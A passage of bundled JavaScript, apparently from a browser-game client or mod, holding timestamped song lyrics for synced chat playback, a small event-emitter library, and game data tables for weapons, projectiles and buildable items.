                                    "to do it again?",
                                    46960
                                ],
                                [
                                    "Come get your spoiler",
                                    50800
                                ],
                                [
                                    "up ahead",
                                    51977
                                ],
                                [
                                    "We're taking over,",
                                    53800
                                ],
                                [
                                    "We're Taking Over",
                                    56832
                                ],
                                [
                                    "Look at you come at my name,",
                                    61760
                                ],
                                [
                                    "you 'oughta know by now,",
                                    62866
                                ],
                                [
                                    "That We're Taking Over,",
                                    66300
                                ],
                                [
                                    "We're Taking Over",
                                    69411
                                ],
                                [
                                    "Maybe you wonder what",
                                    74500
                                ],
                                [
                                    "your futures gonna be but",
                                    76300
                                ],
                                [
                                    "I got it all locked up",
                                    77780
                                ],
                                [
                                    "Take a lap, now",
                                    93800
                                ],
                                [
                                    "Don't be mad, now",
                                    94933
                                ],
                                [
                                    "Run it back, run it back",
                                    97000
                                ],
                                [
                                    "run it back, now",
                                    98777
                                ],
                                [
                                    "I got bodies lining up,",
                                    100100
                                ],
                                [
                                    "Think you're dreaming",
                                    101400
                                ],
                                [
                                    "of greatness",
                                    102663
                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                                [
                                    "",

                                ],
                            ]
                        }
                        this.outtamind = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/981933473709309982/GENTRAMMEL_-_Out_Of_My_Mind__Lyrics_.mp3"),
                            chats: [
                                [
                                    "Remember the night that we met",
                                    12576
                                ],
                                [
                                    "Back at the party",
                                    13709
                                ],
                                [
                                    "you sat on the bed",
                                    14448
                                ],
                                [
                                    "You said I’m talented",
                                    15380
                                ],
                                [
                                    "you said I’m next",
                                    16065
                                ],
                                [
                                    "My only talent",
                                    16922
                                ],
                                [
                                    "is making you stressed",
                                    17695
                                ],
                                [
                                    "I know that I’m not in my best",
                                    18510
                                ],
                                [
                                    "lately I’m feeling like less",
                                    20254
                                ],
                                [
                                    "I hope that I’ll see you again",
                                    21815
                                ],
                                [
                                    "if I don’t than",
                                    23230
                                ],
                                [
                                    "I’ll lay at the rest",
                                    23823
                                ],
                                [
                                    "It’s crazy how it goes",
                                    24705
                                ],
                                [
                                    "left me all alone",
                                    26020
                                ],
                                [
                                    "I’ve been trying to move on",
                                    28056
                                ],
                                [
                                    "all I find are holes",
                                    29465
                                ],
                                [
                                    "Searching for a pot of gold",
                                    31159
                                ],
                                [
                                    "don’t know if I’ll ever know",
                                    32572
                                ],
                                [
                                    "How she left",
                                    34156
                                ],
                                [
                                    "me with no damn place to go",
                                    34881
                                ],
                                [
                                    "I’m okay, I’ll be fine",
                                    37685
                                ],
                                [
                                    "I’m just out of my mind",
                                    40619
                                ],
                                [
                                    "long nights, with no sleep",
                                    43802
                                ],
                                [
                                    "thinking bout you and me",
                                    46646
                                ],
                                [
                                    "I’m okay, I’ll be fine",
                                    49703
                                ],
                                [
                                    "I’m just out of my mind",
                                    52687
                                ],
                                [
                                    "Long nights, with no sleep",
                                    56105
                                ],
                                [
                                    "thinking bout you and me",
                                    59131
                                ],
                                [
                                    "Spent five months",
                                    61884
                                ],
                                [
                                    "at your crib",
                                    62780
                                ],
                                [
                                    "and I ain’t pay no rent",
                                    63749
                                ],
                                [
                                    "We should’ve just been friends",
                                    64595
                                ],
                                [
                                    "Cause I know you never meant",
                                    66714
                                ],
                                [
                                    "all the things that",
                                    67975
                                ],
                                [
                                    "you said to me",
                                    70217
                                ],
                                [
                                    "Froze my heart in uncertainty",
                                    70849
                                ],
                                [
                                    "Go and hit the club in some",
                                    74061
                                ],
                                [
                                    "make sure that you drunk af",
                                    75561
                                ],
                                [
                                    "Find another man you love",
                                    77207
                                ],
                                [
                                    "imma show you what you lost",
                                    78681
                                ],
                                [
                                    "I'mma show you how it feels",
                                    80210
                                ],
                                [
                                    "to realize everything",
                                    81740
                                ],
                                [
                                    "you ever knew",
                                    82722
                                ],
                                [
                                    "And everything you ever",
                                    83692
                                ],
                                [
                                    "had in love is gone",
                                    84701
                                ],
                                [
                                    "I’m okay, I’ll be fine",
                                    86645
                                ],
                                [
                                    "I’m just out of my mind",
                                    88575
                                ],
                                [
                                    "long nights, with no sleep",
                                    93073
                                ],
                                [
                                    "thinking bout you and me",
                                    95794
                                ],
                                [
                                    "I’m okay, I’ll be fine",
                                    98841
                                ],
                                [
                                    "I’m just out of my mind",
                                    102063
                                ],
                                [
                                    "Long nights, with no sleep",
                                    105218
                                ],
                                [
                                    "thinking bout you and me",
                                    107967
                                ],
                                [
                                    "I guess it’s here for real",
                                    110894
                                ],
                                [
                                    "and If I had another chance",
                                    112311
                                ],
                                [
                                    "I don’t know if I’d take",
                                    113554
                                ],
                                [
                                    "that bet against you",
                                    114744
                                ],
                                [
                                    "with another man",
                                    115679
                                ],
                                [
                                    "And if I ever saw your face",
                                    116870
                                ],
                                [
                                    "than I would probably",
                                    118157
                                ],
                                [
                                    "take a glance",
                                    119295
                                ],
                                [
                                    "But I would never bat at night",
                                    119966
                                ],
                                [
                                    "because you hate me",
                                    121188
                                ],
                                [
                                    "that’s a fact",
                                    122158
                                ],
                                [
                                    "I think that this is an epiphany",
                                    123173
                                ],
                                [
                                    "I don’t think that",
                                    124724
                                ],
                                [
                                    "you really listening",
                                    125704
                                ],
                                [
                                    "One day you gonna",
                                    126388
                                ],
                                [
                                    "be missing me",
                                    127116
                                ],
                                [
                                    "I swear to God",
                                    127850
                                ],
                                [
                                    "that we’ll never be frenemies",
                                    128440
                                ],
                                [
                                    "Female dogs be tryna",
                                    129331
                                ],
                                [
                                    "to be friends with me",
                                    130191
                                ],
                                [
                                    "I think they stealing my energy",
                                    130907
                                ],
                                [
                                    "in my DMs and they tempting me",
                                    131654
                                ],
                                [
                                    "I know that you really",
                                    133839
                                ],
                                [
                                    "resenting me now",
                                    134709
                                ],
                                [
                                    "I’m okay, I’ll be fine",
                                    135602
                                ],
                                [
                                    "I’m just out of my mind",
                                    139010
                                ],
                                [
                                    "long nights, with no sleep",
                                    142174
                                ],
                                [
                                    "thinking bout you and me",
                                    144896
                                ],
                                [
                                    "I’m okay, I’ll be fine",
                                    148125
                                ],
                                [
                                    "I’m just out of my mind",
                                    151030
                                ],
                                [
                                    "Long nights, with no sleep",
                                    154548
                                ],
                                [
                                    "thinking bout you and me",
                                    157313
                                ]
                            ]
                        }
                        this.outerspace = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/981935267155951646/BEAUZ_-_Outerspace_Lyrics_feat._Dallas.mp3"),
                            chats: [
                                [
                                    "Falling in quickly",
                                    2267
                                ],
                                [
                                    "Tell me you feel something too",
                                    6056
                                ],
                                [
                                    "Caught in the moment",
                                    9720
                                ],
                                [
                                    "I'm lost here without you",
                                    12072
                                ],
                                [
                                    "Tangled up in your web",
                                    15565
                                ],
                                [
                                    "Holding on to",
                                    18885
                                ],
                                [
                                    "every word you said",
                                    20299
                                ],
                                [
                                    "I'm ready I know",
                                    22258
                                ],
                                [
                                    "I'm hoping it shows",
                                    23880
                                ],
                                [
                                    "Would you say the same?",
                                    25613
                                ],
                                [
                                    "We're falling",
                                    27374
                                ],
                                [
                                    "from the outer space",
                                    28129
                                ],
                                [
                                    "We're moving like a",
                                    29969
                                ],
                                [
                                    "full pace supernova",
                                    30695
                                ],
                                [
                                    "We're making all the",
                                    33892
                                ],
                                [
                                    "headlines now",
                                    35003
                                ],
                                [
                                    "And I just wanna",
                                    36829
                                ],
                                [
                                    "seize the moment",
                                    38230
                                ],
                                [
                                    "'Cause we won't",
                                    40572
                                ],
                                [
                                    "ever slow it down",
                                    41372
                                ],
                                [
                                    "Kissin' in the rain",
                                    42947
                                ],
                                [
                                    "Taste just like champagne",
                                    44601
                                ],
                                [
                                    "Ballin' everyday",
                                    46401
                                ],
                                [
                                    "We're falling from outer space",
                                    47649
                                ],
                                [
                                    "Hopin' time won't change",
                                    49656
                                ],
                                [
                                    "Got love on my brain",
                                    51442
                                ],
                                [
                                    "Would you say the same",
                                    53257
                                ],
                                [
                                    "We're falling from outer space",
                                    54647
                                ],
                                [
                                    "We're falling from outer space",
                                    60982
                                ],
                                [
                                    "We're falling from outer space",
                                    67811
                                ],
                                [
                                    "We're falling from outer space",
                                    74600
                                ],
                                [
                                    "We're falling from outer space",
                                    81321
                                ],
                                [
                                    "Falling in quickly",
                                    86325
                                ],
                                [
                                    "Tell me you feel something too",
                                    90323
                                ],
                                [
                                    "Caught in the moment",
                                    94055
                                ],
                                [
                                    "I'm lost here without you",
                                    96170
                                ],
                                [
                                    "Tangled up in your web",
                                    99442
                                ],
                                [
                                    "Holding on to",
                                    103220
                                ],
                                [
                                    "every word you said",
                                    104814
                                ],
                                [
                                    "I'm ready I know",
                                    106585
                                ],
                                [
                                    "I'm hoping it shows",
                                    108178
                                ],
                                [
                                    "Would you say the same?",
                                    110052
                                ],
                                [
                                    "We're falling from the outer space",
                                    111856
                                ],
                                [
                                    "We're moving like a",
                                    114382
                                ],
                                [
                                    "full pace supernova",
                                    115087
                                ],
                                [
                                    "We're making all the",
                                    118063
                                ],
                                [
                                    "headlines now",
                                    119323
                                ],
                                [
                                    "And I just wanna",
                                    121048
                                ],
                                [
                                    "seize the moment",
                                    122684
                                ],
                                [
                                    "'Cause we won't",
                                    125220
                                ],
                                [
                                    "ever slow it down",
                                    125899
                                ],
                                [
                                    "Kissin' in the rain",
                                    127459
                                ],
                                [
                                    "Taste just like champagne",
                                    129015
                                ],
                                [
                                    "Ballin' everyday",
                                    130840
                                ],
                                [
                                    "We're falling from outer space",
                                    131919
                                ],
                                [
                                    "Hopin' time won't change",
                                    134393
                                ],
                                [
                                    "Got love on my brain",
                                    135921
                                ],
                                [
                                    "Would you say the same?",
                                    137671
                                ],
                                [
                                    "We're falling from outer space (go)",
                                    138737
                                ],
                                [
                                    "We're falling from outer space",
                                    147417
                                ],
                                [
                                    "We're falling from outer space",
                                    153800
                                ],
                                [
                                    "We're falling from outer space",
                                    160563
                                ],
                                [
                                    "We're falling from outer space",
                                    167204
                                ]
                            ]
                        }
                        this.playing = false;
                        this.doing = false;
                        this.current = null;
                        this.loadAudio = function (e) {
                            e.audio.load();
                        }
                        this.nobody = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/911557181353111595/1002036095938207815/Zack_Merci_X_CRVN_-_Nobody_NCS_Release.mp3"),
                            chats: [
                                [
                                    "Children used to run and play",
                                    16047
                                ],
                                [
                                    "Look at all the mess we made",
                                    18834
                                ],
                                [
                                    "Guess I'll never know",
                                    21972
                                ],
                                [
                                    "where it went wrong",
                                    23116
                                ],
                                [
                                    "Sometimes I feel like",
                                    27962
                                ],
                                [
                                    "\"oh, that's sad\"",
                                    28732
                                ],
                                [
                                    "Goes viral then people forget",
                                    30767
                                ],
                                [
                                    "In this crazy world",
                                    33943
                                ],
                                [
                                    "I don't belong",
                                    35045
                                ],
                                [
                                    "I see fire burning",
                                    39164
                                ],
                                [
                                    "but I close my eyes",
                                    41249
                                ],
                                [
                                    "(I'd rather deny that)",
                                    43809
                                ],
                                [
                                    "Everything is falling",
                                    45250
                                ],
                                [
                                    "out of place",
                                    47215
                                ],
                                [
                                    "I see trees ripped",
                                    50541
                                ],
                                [
                                    "from the ground",
                                    52212
                                ],
                                [
                                    "But nobody makes a sound",
                                    54210
                                ],
                                [
                                    "I see fire burning",
                                    57003
                                ],
                                [
                                    "but I'm fine",
                                    59240
                                ],
                                [
                                    "And I am nobody",
                                    61475
                                ],
                                [
                                    "And I am Nobody",
                                    73778
                                ],
                                [
                                    "The future feels so",
                                    99856
                                ],
                                [
                                    "unsure we deserve more",
                                    100949
                                ],
                                [
                                    "The burden that you left",
                                    106005
                                ],
                                [
                                    "is way too heavy for me",
                                    107306
                                ],
                                [
                                    "Do you ever feel like",
                                    111727
                                ],
                                [
                                    "the world would die out",
                                    113251
                                ],
                                [
                                    "My anxiety is of",
                                    114946
                                ],
                                [
                                    "the roof I cry out",
                                    116239
                                ],
                                [
                                    "We have gone too far",
                                    117923
                                ],
                                [
                                    "take me back right now",
                                    118984
                                ],
                                [
                                    "I see fire burning",
                                    124198
                                ],
                                [
                                    "but I close my eyes",
                                    125314
                                ],
                                [
                                    "(I'd rather deny that)",
                                    127683
                                ],
                                [
                                    "Everything is falling",
                                    129231
                                ],
                                [
                                    "out of place",
                                    131229
                                ],
                                [
                                    "I see trees ripped",
                                    134546
                                ],
                                [
                                    "from the ground",
                                    136762
                                ],
                                [
                                    "But nobody makes a sound",
                                    138246
                                ],
                                [
                                    "I see fire burning",
                                    140946
                                ],
                                [
                                    "but I'm fine",
                                    142957
                                ],
                                [
                                    "And I am nobody",
                                    145167
                                ],
                                [
                                    "And I am nobody",
                                    170418
                                ]
                            ]
                        }
                        let scope = this;
                        Object.getOwnPropertyNames(this).filter(e => !["playing", "doing", "current", "loadAudio"].includes(e)).forEach(property => {
                            scope.loadAudio(this[property]);
                        });
                    };
                    function EventLite() {
                        return this instanceof EventLite ? void 0 : new EventLite
                    }! function(e) {
                        function n(e) {
                            for (var n in o) e[n] = o[n];
                            return e
                        }

                        function t(e, n) {
                            return f(this, e).push(n), this
                        }

                        function i(e, n) {
                            function t() {
                                r.call(i, e, t), n.apply(this, arguments)
                            }
                            var i = this;
                            return t.originalListener = n, f(i, e).push(t), i
                        }

                        function r(e, n) {
                            function t(e) {
                                return e !== n && e.originalListener !== n
                            }
                            var i, u = this;
                            if (arguments.length) {
                                if (n) {
                                    if (i = f(u, e, !0)) {
                                        if (i = i.filter(t), !i.length) return r.call(u, e);
                                        u[l][e] = i
                                    }
                                } else if (i = u[l], i && (delete i[e], !Object.keys(i).length)) return r.call(u)
                            } else delete u[l];
                            return u
                        }

                        function u(e, n) {
                            function t(e) {
                                e.call(u)
                            }

                            function i(e) {
                                e.call(u, n)
                            }

                            function r(e) {
                                e.apply(u, a)
                            }
                            var u = this,
                                l = f(u, e, !0);
                            if (!l) return !1;
                            var o = arguments.length;
                            if (1 === o) l.forEach(t);
                            else if (2 === o) l.forEach(i);
                            else {
                                var a = Array.prototype.slice.call(arguments, 1);
                                l.forEach(r)
                            }
                            return !!l.length
                        }

                        function f(e, n, t) {
                            if (!t || e[l]) {
                                var i = e[l] || (e[l] = {});
                                return i[n] || (i[n] = [])
                            }
                        }
                        "undefined" != typeof module && (module.exports = e);
                        var l = "listeners",
                            o = {
                                on: t,
                                once: i,
                                off: r,
                                emit: u
                            };
                        n(e.prototype), e.mixin = n
                    }(EventLite);
                    e.exports.EventLite = EventLite;
                }, function(e, t) {
                    e.exports = function(e) {
                        this.sid = e, this.init = function(e, t, n, i, r, s, a) {
                            s = s || {}, this.sentTo = {}, this.gridLocations = [], this.active = !0, this.doUpdate = s.doUpdate, this.x = e, this.y = t,
                                this.dir = /spik/.test(s.name) ? Math.PI : n,
                                this.xWiggle = 0, this.yWiggle = 0, this.scale = i, this.type = r, this.id = s.id, this.owner = a, this.name = s.name,
                                this.isItem = null != this.id,
                                this.group = s.group, this.health = s.health, this.health1 = this.health, this.lastAttr = Date.now(),
                                this.layer = 2, null != this.group ? this.layer = this.group.layer : 0 == this.type ? this.layer = 3 : 2 == this.type ? this.layer = 0 : 4 == this.type && (this.layer = -1),
                                this.colDiv = s.colDiv || 1, this.blocker = s.blocker, this.ignoreCollision = s.ignoreCollision, this.dontGather = s.dontGather, this.hideFromEnemy = s.hideFromEnemy,
                                this.friction = s.friction, this.projDmg = s.projDmg, this.dmg = s.dmg, this.pDmg = s.pDmg, this.pps = s.pps, this.zIndex = s.zIndex || 0, this.turnSpeed = s.turnSpeed, this.req = s.req,
                                this.trap = s.trap, this.healCol = s.healCol, this.teleport = s.teleport, this.boostSpeed = s.boostSpeed, this.projectile = s.projectile, this.shootRange = s.shootRange,
                                this.shootRate = s.shootRate, this.shootCount = this.shootRate, this.spawnPoint = s.spawnPoint
                        }, this.changeHealth = function(e, t) {
                            this.lastAttr = Date.now();
                            return this.health += e, this.health <= 0
                        }, this.getScale = function(e, t) {
                            return e = e || 1, this.scale * (this.isItem || 2 == this.type || 3 == this.type || 4 == this.type ? 1 : .6 * e) * (t ? 1 : this.colDiv)
                        }, this.visibleToPlayer = function(e) {
                            return !this.hideFromEnemy || this.owner && (this.owner == e || this.owner.team && e.team == this.owner.team)
                        }, this.update = function(e) {
                            this.active && (this.xWiggle && (this.xWiggle *= Math.pow(.99, e)), this.yWiggle && (this.yWiggle *= Math.pow(.99, e))), this.turnSpeed && (this.dir += this.turnSpeed * e) // spin speed
                        }
                    }
                }, function(e, t) {
                    e.exports.groups = [{
                        id: 0,
                        name: "food",
                        layer: 0
                    }, {
                        id: 1,
                        name: "walls",
                        place: !0,
                        limit: 30,
                        layer: 0
                    }, {
                        id: 2,
                        name: "spikes",
                        place: !0,
                        limit: 15,
                        layer: 0
                    }, {
                        id: 3,
                        name: "mill",
                        place: !0,
                        limit: 7,
                        layer: 1
                    }, {
                        id: 4,
                        name: "mine",
                        place: !0,
                        limit: 1,
                        layer: 0
                    }, {
                        id: 5,
                        name: "trap",
                        place: !0,
                        limit: 6,
                        layer: -1
                    }, {
                        id: 6,
                        name: "booster",
                        place: !0,
                        limit: 12,
                        layer: -1
                    }, {
                        id: 7,
                        name: "turret",
                        place: !0,
                        limit: 2,
                        layer: 1
                    }, {
                        id: 8,
                        name: "watchtower",
                        place: !0,
                        limit: 12,
                        layer: 1
                    }, {
                        id: 9,
                        name: "buff",
                        place: !0,
                        limit: 4,
                        layer: -1
                    }, {
                        id: 10,
                        name: "spawn",
                        place: !0,
                        limit: 1,
                        layer: -1
                    }, {
                        id: 11,
                        name: "sapling",
                        place: !0,
                        limit: 2,
                        layer: 0
                    }, {
                        id: 12,
                        name: "blocker",
                        place: !0,
                        limit: 3,
                        layer: -1
                    }, {
                        id: 13,
                        name: "teleporter",
                        place: !0,
                        limit: 2,
                        layer: -1
                    }], t.projectiles = [
                        {
                            indx: 0,
                            layer: 0,
                            src: "arrow_1",
                            dmg: 25,
                            speed: 1.6,
                            scale: 103,
                            range: 1e3
                        }, {
                            indx: 1,
                            layer: 1,
                            dmg: 25,
                            scale: 20
                        }, {
                            indx: 0,
                            layer: 0,
                            src: "arrow_1",
                            dmg: 35,
                            speed: 2.5,
                            scale: 103,
                            range: 1200
                        }, {
                            indx: 0,
                            layer: 0,
                            src: "arrow_1",
                            dmg: 30,
                            speed: 2,
                            scale: 103,
                            range: 1200
                        }, {
                            indx: 1,
                            layer: 1,
                            dmg: 16,
                            scale: 20
                        }, {
                            indx: 0,
                            layer: 0,
                            src: "bullet_1",
                            dmg: 50,
                            speed: 3.6,
                            scale: 160,
                            range: 1400
                        }], t.weapons = [
                        {
                            id: 0,
                            type: 0,
                            name: "tool hammer",
                            desc: "tool for gathering all resources",
                            src: "hammer_1",
                            length: 140,
                            width: 140,
                            xOff: -3,
                            yOff: 18,
                            dmg: 25,
                            range: 65,
                            gather: 1,
                            speed: 300
                        }, {
                            id: 1,
                            type: 0,
                            age: 2,
                            name: "hand axe",
                            desc: "gathers resources at a higher rate",
                            src: "axe_1",
                            length: 140,
                            width: 140,
                            xOff: 3,
                            yOff: 24,
                            dmg: 30,
                            spdMult: 1,
                            range: 70,
                            gather: 2,
                            speed: 400
                        }, {
                            id: 2,
                            type: 0,
                            age: 8,
                            pre: 1,
                            name: "great axe",
                            desc: "deal more damage and gather more resources",
                            src: "great_axe_1",
                            length: 140,
                            width: 140,
                            xOff: -8,
                            yOff: 25,
                            dmg: 35,
                            spdMult: 1,
                            range: 75,
                            gather: 4,
                            speed: 400
                        }, {
                            id: 3,
                            type: 0,
                            age: 2,
                            name: "short sword",
                            desc: "increased attack power but slower move speed",
                            src: "sword_1",
                            iPad: 1.3,
                            length: 130,
                            width: 210,
                            xOff: -8,
                            yOff: 46,
                            dmg: 35,
                            spdMult: .85,
                            range: 110,
                            gather: 1,
                            speed: 300
                        }, {
                            id: 4,
                            type: 0,
                            age: 8,
                            pre: 3,
                            name: "katana",
                            desc: "greater range and damage",
                            src: "samurai_1",
                            iPad: 1.3,
                            length: 130,
                            width: 210,
                            xOff: -8,
                            yOff: 59,
                            dmg: 40,
                            spdMult: .8,
                            range: 118,
                            gather: 1,
                            speed: 300
                        }, {
                            id: 5,
                            type: 0,
                            age: 2,
                            name: "polearm",
                            desc: "long range melee weapon",
                            src: "spear_1",
                            iPad: 1.3,
                            length: 130,
                            width: 210,
                            xOff: -8,
                            yOff: 53,
                            dmg: 45,
                            knock: .2,
                            spdMult: .82,
                            range: 142,
                            gather: 1,
                            speed: 700
                        }, {
                            id: 6,
                            type: 0,
                            age: 2,
                            name: "bat",
                            desc: "fast long range melee weapon",
                            src: "bat_1",
                            iPad: 1.3,
                            length: 110,
                            width: 180,
                            xOff: -8,
                            yOff: 53,
                            dmg: 20,
                            knock: .7,
                            range: 110,
                            gather: 1,
                            speed: 300
                        }, {
                            id: 7,
                            type: 0,
                            age: 2,
                            name: "daggers",
                            desc: "really fast short range weapon",
                            src: "dagger_1",
                            iPad: .8,
                            length: 110,
                            width: 110,
                            xOff: 18,
                            yOff: 0,
                            dmg: 20,
                            knock: .1,
                            range: 65,
                            gather: 1,
                            hitSlow: .1,
                            spdMult: 1.13,
                            speed: 100
                        }, {
                            id: 8,
                            type: 0,
                            age: 2,
                            name: "stick",
                            desc: "great for gathering but very weak",
                            src: "stick_1",
                            length: 140,
                            width: 140,
                            xOff: 3,
                            yOff: 24,
                            dmg: 1,
                            spdMult: 1,
                            range: 70,
                            gather: 7,
                            speed: 400
                        }, {
                            id: 9,
                            type: 1,
                            age: 6,
                            name: "hunting bow",
                            desc: "bow used for ranged combat and hunting",
                            src: "bow_1",
                            req: ["wood", 4],
                            length: 120,
                            width: 120,
                            xOff: -6,
                            yOff: 0,
                            projectile: 0,
                            spdMult: .75,
                            speed: 600
                        }, {
                            id: 10,
                            type: 1,
                            age: 6,
                            name: "great hammer",
                            desc: "hammer used for destroying structures",
                            src: "great_hammer_1",
                            length: 140,
                            width: 140,
                            xOff: -9,
                            yOff: 25,
                            dmg: 10,
                            spdMult: .88,
                            range: 75,
                            sDmg: 7.5,
                            gather: 1,
                            speed: 400
                        }, {
                            id: 11,
                            type: 1,
                            age: 6,
                            name: "wooden shield",
                            desc: "blocks projectiles and reduces melee damage",
                            src: "shield_1",
                            length: 120,
                            width: 120,
                            shield: .2,
                            xOff: 6,
                            yOff: 0,
                            spdMult: .7
                        }, {
                            id: 12,
                            type: 1,
                            age: 8,
                            pre: 9,
                            name: "crossbow",
                            desc: "deals more damage and has greater range",
                            src: "crossbow_1",
                            req: ["wood", 5],
                            aboveHand: !0,
                            armS: .75,
                            length: 120,
                            width: 120,
                            xOff: -4,
                            yOff: 0,
                            projectile: 2,
                            spdMult: .7,
                            speed: 700
                        }, {
                            id: 13,
                            type: 1,
                            age: 9,
                            pre: 12,
                            name: "repeater crossbow",
                            desc: "high firerate crossbow with reduced damage",
                            src: "crossbow_2",
                            req: ["wood", 10],
                            aboveHand: !0,
                            armS: .75,
                            length: 120,
                            width: 120,
                            xOff: -4,
                            yOff: 0,
                            projectile: 3,
                            spdMult: .7,
                            speed: 230
                        }, {
                            id: 14,
                            type: 1,
                            age: 6,
                            name: "mc grabby",
                            desc: "steals resources from enemies",
                            src: "grab_1",
                            length: 130,
                            width: 210,
                            xOff: -8,
                            yOff: 53,
                            dmg: 0,
                            steal: 250,
                            knock: .2,
                            spdMult: 1.05,
                            range: 125,
                            gather: 0,
                            speed: 700
                        }, {
                            id: 15,
                            type: 1,
                            age: 9,
                            pre: 12,
                            name: "musket",
                            desc: "slow firerate but high damage and range",
                            src: "musket_1",
                            req: ["stone", 10],
                            aboveHand: !0,
                            rec: .35,
                            armS: .6,
                            hndS: .3,
                            hndD: 1.6,
                            length: 205,
                            width: 205,
                            xOff: 25,
                            yOff: 0,
                            projectile: 5,
                            hideProjectile: !0,
                            spdMult: .6,
                            speed: 1500
                        }], e.exports.list = [{
                            group: e.exports.groups[0],
                            name: "apple",
                            desc: "restores 20 health when consumed",
                            req: ["food", 10],
                            consume: function(e) {
                                return e.changeHealth(20, e)
                            },
                            scale: 22,
                            holdOffset: 15
                        }, {
                            age: 3,
                            group: e.exports.groups[0],
                            name: "cookie",
                            desc: "restores 40 health when consumed",
                            req: ["food", 15],
                            consume: function(e) {
                                return e.changeHealth(40, e)
                            },
                            scale: 27,
                            holdOffset: 15
                        }, {
                            age: 7,
                            group: e.exports.groups[0],
                            name: "cheese",
                            desc: "restores 30 health and another 50 over 5 seconds",
                            req: ["food", 25],
                            consume: function(e) {
                                return !!(e.changeHealth(30, e) || e.health < 100) && (e.dmgOverTime.dmg = -10, e.dmgOverTime.doer = e, e.dmgOverTime.time = 5, !0)
                            },
                            scale: 27,
                            holdOffset: 15
                        }, {
                            group: e.exports.groups[1],
                            name: "wood wall",
                            desc: "provides protection for your village",
                            req: ["wood", 10],
                            projDmg: !0,
                            health: 380,
                            scale: 50,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            age: 3,
                            group: e.exports.groups[1],
                            name: "stone wall",
                            desc: "provides improved protection for your village",
                            req: ["stone", 25],
                            health: 900,
                            scale: 50,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            age: 7,
                            pre: 1,
                            group: e.exports.groups[1],
                            name: "castle wall",
                            desc: "provides powerful protection for your village",
                            req: ["stone", 35],
                            health: 1500,
                            scale: 52,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            group: e.exports.groups[2],
                            name: "spikes",
                            desc: "damages enemies when they touch them",
                            req: ["wood", 20, "stone", 5],
                            health: 400,
                            dmg: 20,
                            scale: 49,
                            spritePadding: -23,
                            holdOffset: 8,
                            placeOffset: -5
                        }, {
                            age: 5,
                            group: e.exports.groups[2],
                            name: "greater spikes",
                            desc: "damages enemies when they touch them",
                            req: ["wood", 30, "stone", 10],
                            health: 500,
                            dmg: 35,
                            scale: 52,
                            spritePadding: -23,
                            holdOffset: 8,
                            placeOffset: -5
                        }, {
                            age: 9,
                            pre: 1,
                            group: e.exports.groups[2],
                            name: "poison spikes",
                            desc: "poisons enemies when they touch them",
                            req: ["wood", 35, "stone", 15],
                            health: 600,
                            dmg: 30,
                            pDmg: 5,
                            scale: 52,
                            spritePadding: -23,
                            holdOffset: 8,
                            placeOffset: -5
                        }, {
                            age: 9,
                            pre: 2,
                            group: e.exports.groups[2],
                            name: "spinning spikes",
                            desc: "damages enemies when they touch them",
                            req: ["wood", 30, "stone", 20],
                            health: 500,
                            dmg: 45,
                            turnSpeed: .003,
                            scale: 52,
                            spritePadding: -23,
                            holdOffset: 8,
                            placeOffset: -5
                        }, {
                            group: e.exports.groups[3],
                            name: "windmill",
                            desc: "generates gold over time",
                            req: ["wood", 50, "stone", 10],
                            health: 400,
                            pps: 1,
                            turnSpeed: 0, // .0016
                            spritePadding: 25,
                            iconLineMult: 12,
                            scale: 45,
                            holdOffset: 20,
                            placeOffset: 5
                        }, {
                            age: 5,
                            pre: 1,
                            group: e.exports.groups[3],
                            name: "faster windmill",
                            desc: "generates more gold over time",
                            req: ["wood", 60, "stone", 20],
                            health: 500,
                            pps: 1.5,
                            turnSpeed: 0, //.0025
                            spritePadding: 25,
                            iconLineMult: 12,
                            scale: 47,
                            holdOffset: 20,
                            placeOffset: 5
                        }, {
                            age: 8,
                            pre: 1,
                            group: e.exports.groups[3],
                            name: "power mill",
                            desc: "generates more gold over time",
                            req: ["wood", 100, "stone", 50],
                            health: 800,
                            pps: 2,
                            turnSpeed: 0, // .005
                            spritePadding: 25,
                            iconLineMult: 12,
                            scale: 47,
                            holdOffset: 20,
                            placeOffset: 5
                        }, {
                            age: 5,
                            group: e.exports.groups[4],
                            type: 2,
                            name: "mine",
                            desc: "allows you to mine stone",
                            req: ["wood", 20, "stone", 100],
                            iconLineMult: 12,
                            scale: 65,
                            holdOffset: 20,
                            placeOffset: 0
                        }, {
                            age: 5,
                            group: e.exports.groups[11],
                            type: 0,
                            name: "sapling",
                            desc: "allows you to farm wood",
                            req: ["wood", 150],
                            iconLineMult: 12,
                            colDiv: .5,
                            scale: 110,
                            holdOffset: 50,
                            placeOffset: -15
                        }, {
                            age: 4,
                            group: e.exports.groups[5],
                            name: "pit trap",
                            desc: "pit that traps enemies if they walk over it",
                            req: ["wood", 30, "stone", 30],
                            trap: !0,
                            ignoreCollision: !0,
                            hideFromEnemy: !0,
                            health: 500,
                            colDiv: .2,
                            scale: 50,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            age: 4,
                            group: e.exports.groups[6],
                            name: "boost pad",
                            desc: "provides boost when stepped on",
                            req: ["stone", 20, "wood", 5],
                            ignoreCollision: !0,
                            boostSpeed: 1.5,
                            health: 150,
                            colDiv: .7,
                            scale: 45,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            age: 7,
                            group: e.exports.groups[7],
                            doUpdate: !0,
                            name: "turret",
                            desc: "defensive structure that shoots at enemies",
                            req: ["wood", 200, "stone", 150],
                            health: 800,
                            projectile: 1,
                            shootRange: 700,
                            shootRate: 2200,
                            scale: 43,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            age: 7,
                            group: e.exports.groups[8],
                            name: "platform",
                            desc: "platform to shoot over walls and cross over water",
                            req: ["wood", 20],
                            ignoreCollision: !0,
                            zIndex: 1,
                            health: 300,
                            scale: 43,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            age: 7,
                            group: e.exports.groups[9],
                            name: "healing pad",
                            desc: "standing on it will slowly heal you",
                            req: ["wood", 30, "food", 10],
